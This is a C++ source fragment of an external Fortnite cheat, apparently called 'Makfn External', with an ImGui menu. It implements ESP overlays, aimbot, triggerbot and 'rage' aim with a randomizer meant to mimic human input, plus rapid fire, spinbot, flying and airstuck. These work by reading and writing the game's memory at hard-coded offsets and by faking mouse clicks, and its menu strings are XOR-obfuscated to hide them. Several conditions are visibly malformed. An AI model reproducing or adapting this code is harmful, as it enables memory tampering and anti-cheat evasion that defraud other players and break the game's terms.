						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(bottom3.x, bottom3.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(bottom4.x, bottom4.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(bottom1.x, bottom1.y), IM_COL32(144, 0, 255, 255), 0.1f);

						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top2.x, top2.y), ImVec2(top3.x, top3.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top3.x, top3.y), ImVec2(top4.x, top4.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top4.x, top4.y), ImVec2(top1.x, top1.y), IM_COL32(144, 0, 255, 255), 0.1f);

						if (Esp_Distance) {
							XorS(dst, "[%.fm]\n");
							char dist[64];
							sprintf_s(dist, dst.decrypt(), distance);
							DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 255, 255, 255), true);
						}
					}
				}


				if (reloadCheck)
				{
					if (bIsReloadingWeapon)
						ImGui::GetOverlayDrawList()->AddText(ImVec2(Headbox.x, Headbox.y + 20), IM_COL32(255, 255, 255, 255), "PLAYER RELOADING");
				}

				if (playerbot)
				{
					auto fname = GetNameFromFName(CurrentActorId);
					if (strstr(fname.c_str(), ("PlayerPawn_Athena_C")) || strstr(fname.c_str(), ("PlayerPawn_Athena_Phoebe_C")) || strstr(fname.c_str(), ("BP_MangPlayerPawn")))
						DrawString(15, Headbox.x, Headbox.y, &Col.white, true, true, ("BOT"));
					else
						DrawString(15, Headbox.x, Headbox.y, &Col.white, true, true, ("PLAYER"));
				}

				if (fillbox)
				{
					DrawFilledRect(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, &Col.FiledBox);
				}

				if (Esp_box)
				{
					DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(144, 0, 255, 255), 2.5f);

					if (Esp_Distance) {
						XorS(dst, "[%.fm]\n");
						char dist[64];
						sprintf_s(dist, dst.decrypt(), distance);
						DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 255, 255, 255), true);
					}
				}

				if (Esp_fbox)
				{

					DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, 1.5f, IM_COL32(144, 0, 255, 255));


					if (Esp_Distance) {
						XorS(dst, "[%.fm]\n");
						char dist[64];
						sprintf_s(dist, dst.decrypt(), distance);
						DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 255, 255, 255), true);
					}
				}

				if (Esp_line)
				{
					Vector3 vHeadBone = GetBoneWithRotation(CurrentActorMesh, hitbox);
					Vector3 vHeadBoneOut = W2S(vHeadBone);

					DrawLine(Width / 2 - 2, Height, vHeadBoneOut.x, vHeadBoneOut.y, &Col.purple, 0.5f);
				}

				if (Esp_Skeleton)
				{
					Vector3 vHeadBone = GetBoneWithRotation(CurrentActorMesh, 68);
					Vector3 vHeadBoneOut = W2S(vHeadBone);
					Vector3 vHip = GetBoneWithRotation(CurrentActorMesh, 2);
					Vector3 vHipOut = W2S(vHip);
					Vector3 vNeck = GetBoneWithRotation(CurrentActorMesh, 67);
					Vector3 vNeckOut = W2S(vNeck);
					Vector3 vUpperArmLeft = GetBoneWithRotation(CurrentActorMesh, 9);
					Vector3 vUpperArmLeftOut = W2S(vUpperArmLeft);
					Vector3 vUpperArmRight = GetBoneWithRotation(CurrentActorMesh, 38);
					Vector3 vUpperArmRightOut = W2S(vUpperArmRight);
					Vector3 vLeftHand = GetBoneWithRotation(CurrentActorMesh, 10);
					Vector3 vLeftHandOut = W2S(vLeftHand);
					Vector3 vRightHand = GetBoneWithRotation(CurrentActorMesh, 39);
					Vector3 vRightHandOut = W2S(vRightHand);
					Vector3 vLeftHand1 = GetBoneWithRotation(CurrentActorMesh, 30);
					Vector3 vLeftHandOut1 = W2S(vLeftHand1);
					Vector3 vRightHand1 = GetBoneWithRotation(CurrentActorMesh, 59);
					Vector3 vRightHandOut1 = W2S(vRightHand1);
					Vector3 vRightThigh = GetBoneWithRotation(CurrentActorMesh, 78);
					Vector3 vRightThighOut = W2S(vRightThigh);
					Vector3 vLeftThigh = GetBoneWithRotation(CurrentActorMesh, 71);
					Vector3 vLeftThighOut = W2S(vLeftThigh);
					Vector3 vRightCalf = GetBoneWithRotation(CurrentActorMesh, 79);
					Vector3 vRightCalfOut = W2S(vRightCalf);
					Vector3 vLeftCalf = GetBoneWithRotation(CurrentActorMesh, 72);
					Vector3 vLeftCalfOut = W2S(vLeftCalf);
					Vector3 vLeftFoot = GetBoneWithRotation(CurrentActorMesh, 73);
					Vector3 vLeftFootOut = W2S(vLeftFoot);
					Vector3 vRightFoot = GetBoneWithRotation(CurrentActorMesh, 80);
					Vector3 vRightFootOut = W2S(vRightFoot);
					Vector3 vPelvisOut = GetBoneWithRotation(CurrentActorMesh, 2);
					Vector3 vPelvis = W2S(vPelvisOut);

					DrawLine(vHeadBoneOut.x, vHeadBoneOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
					DrawLine(vHipOut.x, vHipOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
					DrawLine(vUpperArmLeftOut.x, vUpperArmLeftOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
					DrawLine(vUpperArmRightOut.x, vUpperArmRightOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
					DrawLine(vLeftHandOut.x, vLeftHandOut.y, vUpperArmLeftOut.x, vUpperArmLeftOut.y, &Col.white, 0.6f);
					DrawLine(vRightHandOut.x, vRightHandOut.y, vUpperArmRightOut.x, vUpperArmRightOut.y, &Col.white, 0.6f);
					DrawLine(vLeftHandOut.x, vLeftHandOut.y, vLeftHandOut1.x, vLeftHandOut1.y, &Col.white, 0.6f);
					DrawLine(vRightHandOut.x, vRightHandOut.y, vRightHandOut1.x, vRightHandOut1.y, &Col.white, 0.6f);
					DrawLine(vLeftThighOut.x, vLeftThighOut.y, vHipOut.x, vHipOut.y, &Col.white, 0.6f);
					DrawLine(vRightThighOut.x, vRightThighOut.y, vHipOut.x, vHipOut.y, &Col.white, 0.6f);
					DrawLine(vLeftCalfOut.x, vLeftCalfOut.y, vLeftThighOut.x, vLeftThighOut.y, &Col.white, 0.6f);
					DrawLine(vRightCalfOut.x, vRightCalfOut.y, vRightThighOut.x, vRightThighOut.y, &Col.white, 0.6f);
					DrawLine(vLeftFootOut.x, vLeftFootOut.y, vLeftCalfOut.x, vLeftCalfOut.y, &Col.white, 0.6f);
					DrawLine(vRightFootOut.x, vRightFootOut.y, vRightCalfOut.x, vRightCalfOut.y, &Col.white, 0.6f);


					if (penis)
					{
						auto penis = W2S({ vPelvis.x, vPelvis.y, vPelvis.z + 3 });
						DrawLine(vPelvis.x, vPelvis.y, penis.x, penis.y, &Col.white, 1.f);
					}

					if (unicorn)
					{
						auto head = W2S({ vHeadBone.x, vHeadBone.y, vHeadBone.z + 3 });
						DrawLine(vHeadBone.x, vHeadBone.y, head.x, head.y, &Col.Magenta, 1.f);
					}
				}
			}

		}

		if (hotkeys)
		{
			if (Hotkey_Exit)
			{
				if (GetAsyncKeyState(VK_F4)) {
					Sleep(200);
					system("exit");
				}
			}
			if (Hotkey_Esp)
			{
				if (GetAsyncKeyState(VK_F5)) {
					Sleep(200);
					Esp = false;

					Sleep(3000);
					return;
				}
			}
			if (hotkey_Reduce)
			{
				if (GetAsyncKeyState(VK_F6)) {
					Sleep(200);
					ShowWindow(GetConsoleWindow(), SW_HIDE);

					Sleep(3000);
					return;
				}
			}
			if (Hotkey_Findclosestpawn)
			{
				if (GetAsyncKeyState(VK_F1) && closestPawn)
				{
					XorS(dst, "[%.fm]\n");
					char dist[64];
					sprintf_s(dist, dst.decrypt(), distance);
					DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 255, 0, 255), true);

					Sleep(3000);
					return;
				}
			}
			if (hotkey_aimat)
			{
				uint64_t currentactormesh = read<uint64_t>(closestPawn + OFFSETS::Mesh);
				uint64_t currentaimbotmesh = read<uint64_t>(currentactormesh + hitbox);
				auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
				Vector3 rootHeadOut = W2S(rootHead);
				auto isDBNO = (read<char>(static_cast<uintptr_t>(CurrentActorId) + 0x7C2) >> 4) & 1;

				if (GetAsyncKeyState(VK_F3), isVisible(currentaimbotmesh) && !isDBNO, Width / 2, Height / 2)
				{
					aimbot(rootHeadOut.x, rootHeadOut.x);

					Sleep(3000);
					return;
				}
			}
		}

		if (AimCheck)
		{
			uint64_t currentactormesh = read<uint64_t>(closestPawn + OFFSETS::Mesh);
			uint64_t CurrentHitboneMesh = read<uint64_t>(currentactormesh + hitbox);
			auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
			Vector3 hitbone = W2S(rootHead);
			auto isDBNO = (read<char>(static_cast<uintptr_t>(CurrentActorId) + 0x7C2) >> 4) & 1;

			if (closestPawn || !isDBNO) {
				if (hitbone.x != 0 && hitbone.y != 0 && hitbone.z != 0)
				{
					char dist[64];
					XorS(frame, "your aiming at a player");
					sprintf_s(dist, frame.decrypt(), distance);
					DrawText1(900, 15, dist, &Col.purple);
				}
			}
		}

		if (triggerbot)
		{
			uint64_t currentactormesh = read<uint64_t>(closestPawn + OFFSETS::Mesh);
			auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
			Vector3 hitbone = W2S(rootHead);
			uint64_t currentaimbotmesh = read<uint64_t>(currentactormesh + hitbox);
			auto isDBNO = (read<char>(static_cast<uintptr_t>(CurrentActorId) + 0x7C2) >> 4) & 1;

			if (distance < AimFOV)
			{
				if (GetAsyncKeyState(VK_RBUTTON)) {
					if (closestPawn != 0)
					{
						if (hitbone.x != 0 || hitbone.y != 0 || hitbone.z != 0)
						{
							if (!isDBNO) {
								keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
							}
							keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_KEYUP, 0);
						}
						keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_KEYUP, 0);
					}
					keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_KEYUP, 0);
				}
			}
		}

		if (RageAim)
		{
			uint64_t currentactormesh = read<uint64_t>(closestPawn + OFFSETS::Mesh);
			uint64_t currentaimbotmesh = read<uint64_t>(currentactormesh + hitbox);
			auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
			Vector3 rootHeadOut = W2S(rootHead);
			auto isDBNO = (read<char>(static_cast<uintptr_t>(CurrentActorId) + 0x7C2) >> 4) & 1;

			if (GetAsyncKeyState(VK_RBUTTON)) {
				if (closestPawn != 0)
				{
					if (isVisible(currentaimbotmesh) && !isDBNO)
					{
						if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0)
						{
							aimbot(rootHeadOut.x, rootHeadOut.y);
							AimbotRandomizer(100000.0, 200000.0);
							keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
						}
						keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_KEYUP, 0);
					}
					keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_KEYUP, 0);
				}
				keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_KEYUP, 0);
			}

		}

		if (memoryaim)
		{
			uint64_t currentactormesh = read<uint64_t>(closestPawn + OFFSETS::Mesh);
			auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
			Vector3 hitbone = W2S(rootHead);
			uint64_t currentaimbotmesh = read<uint64_t>(currentactormesh + hitbox);
			auto isDBNO = (read<char>(static_cast<uintptr_t>(CurrentActorId) + 0x7C2) >> 4) & 1;
			Vector3 Head = W2S(Vector3(Headpos.x != 0, Headpos.y != 0, Headpos.z != 0));
			Vector3 Headpos = W2S(Vector3(Headpos.x, Headpos.y, Headpos.z));

			if ((Headpos.x, Headpos.y, Headpos.z, Process::WindowWidth / 2, Process::WindowHeight / 2) <= AimFOV) {
				if (isVisible(currentaimbotmesh) && !isDBNO) {
					if (localactorpos.Distance(Headpos) / 3.f) {
						aimbot(hitbone.x, hitbone.y);
					}
				}
			}
		}

		if (spinbot)
		{
			auto Mesh = read<uint64_t>(LocalPawn + 0x310);
			write<Vector3>(Mesh + 0x140, Vector3(1, rand() % SpinBotValue, 1));
		}

		if (boatfly)
		{
			if (LocalPawn)
			{

				//AFortAthenaVehicle    FrontMassRatio    0x958    float
				//AFortAthenaVehicle    RearMassRatio    0x95c    float
				uint64_t VEHICLE_STATS = read<uint64_t>(LocalPawn + 0x2348); //AFortPlayerPawn    CurrentVehicle    0x21b8    AActor *
				if (GetAsyncKeyState(VK_SHIFT))write<char>(VEHICLE_STATS + 0x6AA, 1);//AFortAthenaVehicle    bUseGravity : 1    	0x67a    char
				uintptr_t LocalVehicle = read<uintptr_t>(LocalPawn + 0x2348);
				if (LocalVehicle)
				{
					write<float>(LocalVehicle + 0x9A0, -0.100);
					write<float>(LocalVehicle + 0x9A4, -0.100);
				}
			}
		}

		if (RapidFire)
		{
			float a = 0;
			float b = 0;
			uintptr_t CurrentWeapon = read<uintptr_t>(PlayerState + 0x868);
			if (CurrentWeapon) {
				a = read<float>(CurrentWeapon + 0xAB0); //LastFireTime Offset
				b = read<float>(CurrentWeapon + 0xAB4); //LastFireTimeVerified Offset
				write<float>(CurrentWeapon + 0xAB0, a + b - 0.003); //LastFireTime Offset
			}
		}

		if (nominigun) {
			{
				float TimeHeatWasLastAdded = read<float>(LocalPawn + 0x1474);
				if (TimeHeatWasLastAdded != 0.f) {
					write<float>(LocalPawn + 0x1474, 0.f);
				}
				float TimeOverheatedBegan = read<float>(LocalPawn + 0x1478);

				if (TimeOverheatedBegan != 0.f) {
					write<float>(LocalPawn + 0x1478, 0.f);
				}

				float OverheatValue = read<float>(LocalPawn + 0x146C);
				if (OverheatValue != 0.f) {
					write<float>(LocalPawn + 0x146C, 0.f);
				}

				float WeaponOverheatedAnimation = read<float>(LocalPawn + 0x1460);
				if (WeaponOverheatedAnimation != 0.f) {
					write<float>(LocalPawn + 0x1460, 0.f);
				}
			}
		}

		if (TPose)
		{
			auto Mesh = read<uint64_t>(LocalPawn + 0x310);
			write<int>(Mesh + 0x9CA, 1);
		}

		if (playerfly)
		{
			if (LocalPawn)
			{
				write<float>(LocalPawn + 0x2088, 10.0f); //AFortPlayerPawn	ZiplineJumpStrength	0x1c40	FCurveTableRowHandle
				write<bool>(LocalPawn + 0x2088 + 0x18, true);
			}
		}
		
		if (nospread)
		{
			if (GetAsyncKeyState(VK_RBUTTON)) { //Alt Keybind
				write<float>(currentgun + 0x64, 99); //CustomTimeDilation Offset
			}
			else {
				write<float>(currentgun + 0x64, 1); //CustomTimeDilation Offset
			}
		}

		if (FOVChanger)
		{
			uintptr_t PlayerCameraManager = read<uintptr_t>(PlayerController + 0x338);
			write<float>(PlayerCameraManager + 0x29c + 0x4, FOVChangerValue); //default fov
		}

		if (FOVChanger)
		{
			write(PlayerCameraManager + 0x350, FOVChangerValue);
		}

		if (noweaponanimation)
		{
			uintptr_t CurrentWeapon = read<uintptr_t>(LocalPawn + 0x868); //CurrentWeapon Offset
			if (CurrentWeapon) {
				write<bool>(CurrentWeapon + 0x32B, true); //bDisableEquipAnimation Offset (update this yourself)
			}
		}

		if (AirStuck) {  //Freezes You in the Air
			if (GetAsyncKeyState(VK_SPACE)) { //Alt Keybind
				write<float>(LocalPawn + 0x64, 0); //CustomTimeDilation
			}
			else {
				write<float>(LocalPawn + 0x64, 1); //CustomTimeDilation
			}
		}

		if (glitch)
		{
			if (LocalPawn && PlayerController) {
				auto Mesh = read<uint64_t>(LocalPawn + 0x310);
				write<Vector3>(Mesh + 0x140, Vector3(1, rand() % 9, 1));
			}
		}

		if (MouseMovementAimbot)
		{
			auto dx = w2shead.x - (Width / 2);
			auto dy = w2shead.y - (Height / 2);
			auto dist = sqrtf(dx * dx + dy * dy);
			if (dist < AimFOV && dist < closestDistance) {
				if (isVisible(CurrentActorMesh)) {
					if (!isDBNO) {
						closestDistance = dist;
						closestPawn = CurrentActor;
					}
				}
			}
		}
	}

	if (MouseMovementAimbot)
	{
		auto isDBNO = (read<uintptr_t>(CurrentActorId + OFFSETS::IsDBNO));
		uint64_t currentactormesh = read<uint64_t>(closestPawn + OFFSETS::Mesh);
		auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
		Vector3 hitbone = W2S(rootHead);
		Vector3 Headpos = GetBoneWithRotation(currentactormesh, 68);
		Vector3 HeadBoneOut = W2S(Vector3(hitbone.x, hitbone.y, hitbone.z));
		auto AimbotMesh = (HeadBoneOut, !isDBNO);

		if (closestPawn && GetAsyncKeyState(VK_RBUTTON) < 0) {
			if (closestPawn != 0)
			{
				if (hitbone.x != 10 || hitbone.y != 10 || hitbone.z != 10)
				{
					if ((GetDistance(hitbone.x, hitbone.y, hitbone.z, Process::WindowWidth / 2, Process::WindowHeight / 2) <= AimFOV))
					{
						if (isVisible(AimbotMesh)) {
							aimbot(hitbone.x, hitbone.y);
							AimbotRandomizer(100000.0, 200000.0);
						}
					}
				}
			}
		}
	}

	Sleep(0.2);
}

void render() {

	ImGui_ImplDX9_NewFrame();
	ImGui_ImplWin32_NewFrame();
	ImGui::NewFrame();

	XorS(menu, "Makfn");

	XorS(enable_esp, "Enable Esp");
	XorS(BoxCorner, "Corner Box Esp");
	XorS(snapline, "Snap line");
	XorS(es5, "Max Visuals Distance");

	XorS(aim1, "Soft Aimbot");
	XorS(aim2, "Aimbot Key");
	XorS(aim3, "Aimbot Bone");
	XorS(aim6, "Aimbot FOV");
	XorS(aim7, "Smoothness");
	XorS(aim8, "AmmoESP");
	XorS(FOV, "Aimbot Fov");
	XorS(FOValue, "FovChanger Value");
	XorS(Aim3s, "ESP Color");
	XorS(LootDistance, "Loot Esp Distance");

	if (particles)
	{
		static float f = 0.2f;
		static int counter = 0;


		ImGuiStyle& style = ImGui::GetStyle();

		ImGui::SetNextWindowPos(ImVec2(0, 0));
		ImGui::SetNextWindowSize(ImVec2(3000, 3000));
		ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(0.1f, 0.1f, 0.1f, 0.5f));

		ImGui::Begin("##bg", nullptr, ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoFocusOnAppearing | ImGuiWindowFlags_NoInputs | ImGuiWindowFlags_NoTitleBar);
		{
			//proper draw call
			draw = ImGui::GetWindowDrawList();

			ImVec2 screenSize = ImGui::GetIO().DisplaySize;
			ImGui::Particles(draw, screenSize);

		}ImGui::End();
		ImGui::PopStyleColor();
	}

	if (DeveloperAdjust == true) { 	if (GetAsyncKeyState(VK_DOWN) & 1) { DeveloperAdjust = false; } }
	if (DeveloperAdjust == true)
	{
		ImGui::StyleColorsClassic();
		ImGuiStyle& style = ImGui::GetStyle();
		style.Colors[ImGuiCol_Text] = ImVec4(0.972f, 0.967f, 0.967f, 1.000f);
		style.Colors[ImGuiCol_TextDisabled] = ImVec4(0.989f, 0.989f, 0.989f, 1.000f);
		style.Colors[ImGuiCol_BorderShadow] = ImVec4(0.983f, 0.041f, 0.041f, 0.000f);
		style.Colors[ImGuiCol_FrameBg] = ImVec4(0.485f, 0.148f, 0.148f, 0.540f);
		style.Colors[ImGuiCol_FrameBgHovered] = ImVec4(0.457f, 0.116f, 0.116f, 0.400f);
		style.Colors[ImGuiCol_FrameBgActive] = ImVec4(0.423f, 0.060f, 0.060f, 0.670f);
		style.Colors[ImGuiCol_TitleBg] = ImVec4(0.978f, 0.019f, 0.019f, 1.000f);
		style.Colors[ImGuiCol_TitleBgActive] = ImVec4(0.989f, 0.025f, 0.025f, 1.000f);
		style.Colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.473f, 0.044f, 0.044f, 0.510f);
		style.Colors[ImGuiCol_MenuBarBg] = ImVec4(0.574f, 0.037f, 0.037f, 1.000f);
		style.Colors[ImGuiCol_ScrollbarBg] = ImVec4(0.008f, 0.008f, 0.008f, 0.530f);
		style.Colors[ImGuiCol_CheckMark] = ImVec4(0.720f, 0.127f, 0.127f, 1.000f);
		style.Colors[ImGuiCol_SliderGrab] = ImVec4(0.720f, 0.111f, 0.111f, 1.000f);
		style.Colors[ImGuiCol_SliderGrabActive] = ImVec4(0.944f, 0.119f, 0.119f, 1.000f);
		style.Colors[ImGuiCol_Button] = ImVec4(0.787f, 0.130f, 0.130f, 0.400f);
		style.Colors[ImGuiCol_ButtonHovered] = ImVec4(0.989f, 0.019f, 0.019f, 1.000f);
		style.Colors[ImGuiCol_ButtonActive] = ImVec4(0.787f, 0.130f, 0.130f, 0.400f);
		style.WindowPadding = ImVec2(9.000f, 8.000f);
		style.WindowRounding = 11.000f;
		static int tabb = 0;

		ImGui::SetNextWindowSize(ImVec2(490.000f, 360.000f), ImGuiCond_Once);
		if (!ImGui::Begin("Cheat Menu Stats", NULL, 59))
		{
			ImGui::End();
			return;
		}
		if (ImGui::Button("Extentions", ImVec2(130.000f, 28.000f))) { tabb = 2; }
		ImGui::SameLine();
		if (ImGui::Button("Hotkeys", ImVec2(130.000f, 28.000f))) { tabb = 3; }
		ImGui::SameLine();
		if (ImGui::Button("World Esp", ImVec2(130.000f, 28.000f))) { tabb = 4; }
		ImGui::Spacing();
		static ImVec4 inactive = ImColor(0, 136, 255, 255);
		static ImVec4 active = ImColor(255, 255, 255, 255);
		switch (tabb) {
		case 0:
			ImGui::Text("                    Hotkey (DOWN) To Close");
			break;
		case 1:
			break;
		case 2:
			ImGui::Text("Esp Extentions");
			ImGui::Checkbox("Unicorn Esp", &unicorn);
			ImGui::Checkbox("Penis Esp", &penis);
			ImGui::Text("Aimbot Extentions");
			ImGui::Checkbox("Rage Aimbot", &RageAim);
			ImGui::Checkbox("RandomizeWithTime", &RandomizeWithTime);
			if (RandomizeWithTime == true) {
				ImGui::Spacing();
				ImGui::SliderInt("SetMouse Switch Speed", &SetMouseSpeed, 0.1f, 15.f);
				ImGui::SameLine();
				ImGui::TextColored(ImColor(0, 136, 255, 255), ("Seconds"));
				ImGui::SliderInt("MouseMovement Switch Speed", &MouseSwitchSpeed, 0.1f, 15.f);
				ImGui::SameLine();
				ImGui::TextColored(ImColor(0, 136, 255, 255), ("Seconds"));
				ImGui::SameLine();
				ImGui::TextColored(ImColor(0, 136, 255, 255), ("[?]"));
				if (ImGui::IsItemHovered()) {
					ImGui::BeginTooltip();
					ImGui::Text(("The speed of the Aimbot Method Changing, Mousemovement should be the highest and SetMouse should be lowest."));
					ImGui::EndTooltip();
				}
			}
			ImGui::Spacing();
			if (hitboxpos == 0) { ImGui::Text("                        Current Aim: Head"); }
			else if (hitboxpos == 1) { ImGui::Text("                        Current Aim: Neck"); }
			else if (hitboxpos == 2) { ImGui::Text("                        Current Aim: Chest"); }
			else if (hitboxpos == 3) { ImGui::Text("                        Current Aim: Pelvis"); }
			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		case 3:
			if (hotkeys == false) {
				ImGui::Checkbox("Hotkey Selection", &hotkeys);
				ImGui::Text("Hotkeys for External");
			}
			else if (hotkeys == true)
			{
				ImGui::Text("Hotkey Selection For External");
				ImGui::Spacing();
				ImGui::Checkbox("Hotkey End", &Hotkey_Exit);
				ImGui::SameLine();
				ImGui::TextColored(ImColor(255, 0, 0, 255), ("F4"));
				ImGui::Checkbox("Hotkey Stop Cheat", &Hotkey_Esp);
				ImGui::SameLine();
				ImGui::TextColored(ImColor(255, 0, 0, 255), ("F5"));
				ImGui::Checkbox("Hotkey Reduce Lag", &hotkey_Reduce);
				ImGui::SameLine();
				ImGui::TextColored(ImColor(255, 0, 0, 255), ("F6"));
				ImGui::Checkbox("Hotkey Find CLosest Pawn", &Hotkey_Findclosestpawn);
				ImGui::SameLine();
				ImGui::TextColored(ImColor(255, 0, 0, 255), ("F1"));
				ImGui::Spacing();
				ImGui::Text("Aimbot Hotkeys");
				ImGui::Checkbox("Aim at closestpawn", &hotkey_aimat);
				ImGui::SameLine();
				ImGui::TextColored(ImColor(255, 0, 0, 255), ("F3"));
				ImGui::Spacing();
				ImGui::Checkbox("Hotkey Selection", &hotkeys);
			}
			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		case 4:
			ImGui::Text("World Esp");
			ImGui::Spacing();
			ImGui::Checkbox("Loot Ammo", &world_ammo);
			ImGui::Checkbox("Loot Chests", &world_chests);
			ImGui::Checkbox("Loot Lama", &world_lama);
			ImGui::Checkbox("Loot Supplydrops", &world_supplydrop);
			ImGui::Checkbox("Loot Weapons", &world_weapon);
			ImGui::Checkbox("World Cars", &world_car);
			ImGui::Checkbox("World Boats", &world_boat);
			ImGui::Checkbox("World Animals", &world_animal);
			ImGui::Spacing();
			ImGui::SliderInt("World Esp Rendering", &WorldEspDistance, 1.f, 1000.f);
			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		}
		ImGui::End();
	}

	if (GetAsyncKeyState(VK_INSERT) & 1) { ShowMenu = !ShowMenu; }
	if (ShowMenu)
	{
		ImVec4* colors = ImGui::GetStyle().Colors;
		colors[ImGuiCol_Text] = ImVec4(0.80f, 0.80f, 0.83f, 1.00f);
		colors[ImGuiCol_TextDisabled] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		colors[ImGuiCol_WindowBg] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_ChildWindowBg] = ImVec4(0.07f, 0.07f, 0.09f, 1.00f);
		colors[ImGuiCol_PopupBg] = ImVec4(0.07f, 0.07f, 0.09f, 1.00f);
		colors[ImGuiCol_Border] = ImVec4(0.80f, 0.80f, 0.83f, 0.88f);
		colors[ImGuiCol_BorderShadow] = ImVec4(0.92f, 0.91f, 0.88f, 0.00f);
		colors[ImGuiCol_FrameBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_FrameBgHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		colors[ImGuiCol_FrameBgActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_MenuBarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_ScrollbarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
		colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_SliderGrab] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
		colors[ImGuiCol_SliderGrabActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_Button] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_ButtonHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		colors[ImGuiCol_ButtonActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_Header] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_HeaderHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_HeaderActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_Column] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_ColumnHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		colors[ImGuiCol_ColumnActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_ResizeGrip] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
		colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_ResizeGripActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
